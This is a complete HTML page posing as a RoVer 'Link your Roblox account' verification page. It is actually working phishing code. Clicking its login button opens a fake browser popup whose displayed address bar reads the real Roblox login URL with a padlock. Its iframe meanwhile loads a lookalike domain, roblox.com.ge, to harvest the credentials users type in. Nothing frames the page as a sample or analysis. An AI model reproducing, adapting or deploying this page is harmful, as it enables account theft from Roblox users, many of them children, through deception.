<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Verify | RoVer</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #121216;
      --card-bg: #1E1E23;
      --accent: #D01677;
      --text-light: #E1E1E4;
      --text-muted: #A0A0A5;
      --btn-bg: #D01677;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body { height:100%; }
    body {
      font-family: 'Inter', sans-serif;
      background: var(--bg);
      color: var(--text-light);
      display:flex;
      flex-direction:column;
      align-items: center;
      justify-content: center;
      padding:20px;
    }
    .card {
      background: var(--card-bg);
      border-radius: 12px;
      padding: 36px 32px;
      max-width: 400px;
      width:100%;
      text-align:center;
      box-shadow: 0 8px 24px rgba(0,0,0,0.6);
    }
    .card h1 {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 12px;
    }
    .card p {
      color: var(--text-muted);
      font-size: 15px;
      margin-bottom: 24px;
    }
    .btn {
      display:inline-block;
      width:100%;
      padding: 14px 0;
      background: var(--btn-bg);
      color: white;
      font-size:16px;
      font-weight:600;
      border:none;
      border-radius:8px;
      cursor:pointer;
      transition: opacity 0.2s ease, transform 0.2s ease;
    }
    .btn:hover {
      opacity:0.9;
      transform: translateY(-2px);
    }
    @media (max-width:500px){
      .card { padding: 28px 20px; }
      .card h1 { font-size:20px; }
    }
    /* Popup & overlay preserved */
    .overlay {
      display: none;
      position: fixed;
      top:0; left:0;
      width:100vw; height:100vh;
      background: rgba(0,0,0,0.7);
      z-index:1000;
    }
    .fake-popup {
      display: none;
      position: fixed;
      top:50%; left:50%;
      transform: translate(-50%, -50%);
      width:90%; max-width:700px;
      height:600px;
      background: #fff;
      border-radius:10px;
      overflow:hidden;
      z-index:1001;
      box-shadow: 0 20px 60px rgba(0,0,0,0.7);
    }
    .window-bar {
      height: 36px;
      background: #f4f4f4;
      display:flex;
      align-items:center;
      justify-content: space-between;
      padding: 0 12px;
      font-size:14px;
      color:#333;
    }
    .popup-close {
      font-size:20px;
      cursor:pointer;
      color:#666;
    }
    .url-bar {
      margin:10px;
      padding:6px 10px;
      background:#fafafa;
      border:1px solid #e2e2e2;
      font-family: monospace;
      font-size:13px;
      color:#333;
      border-radius:6px;
    }
    .popup-iframe {
      width:100%;
      height: calc(100% - 76px);
      border:none;
    }
  </style>
</head>
<body>

  <div class="card">
    <h1>Link your Roblox account</h1>
    <p>You will be redirected to Roblox to complete verification.</p>
    <button class="btn" id="loginBtn">Log in with Roblox</button>
  </div>

  <!-- Overlay & Popup -->
  <div class="overlay" id="overlay"></div>
  <div class="fake-popup" id="fakePopup">
    <div class="window-bar">
      ROBLOX
      <div class="popup-close" id="popupClose">&times;</div>
    </div>
    <div class="url-bar" id="urlDisplay">ðŸ”’ https://www.roblox.com/login</div>
    <iframe class="popup-iframe" id="popupIframe" title="Roblox login"></iframe>
  </div>

  <script>
    const loginBtn = document.getElementById("loginBtn");
    const fakePopup = document.getElementById("fakePopup");
    const overlay = document.getElementById("overlay");
    const popupClose = document.getElementById("popupClose");
    const iframe = document.getElementById("popupIframe");
    const urlDisplay = document.getElementById("urlDisplay");

    loginBtn.addEventListener("click", () => {
      const realUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
      const fakeUrl = "https://www.roblox.com/login";

      overlay.style.display = "block";
      fakePopup.style.display = "block";
      iframe.src = "";
      urlDisplay.textContent = fakeUrl;

      setTimeout(() => { iframe.src = realUrl; }, 50);
    });

    popupClose.addEventListener("click", () => {
      overlay.style.display = "none";
      fakePopup.style.display = "none";
      iframe.src = "";
    });

    overlay.addEventListener("click", () => {
      overlay.style.display = "none";
      fakePopup.style.display = "none";
      iframe.src = "";
    });
  </script>

</body>
</html>
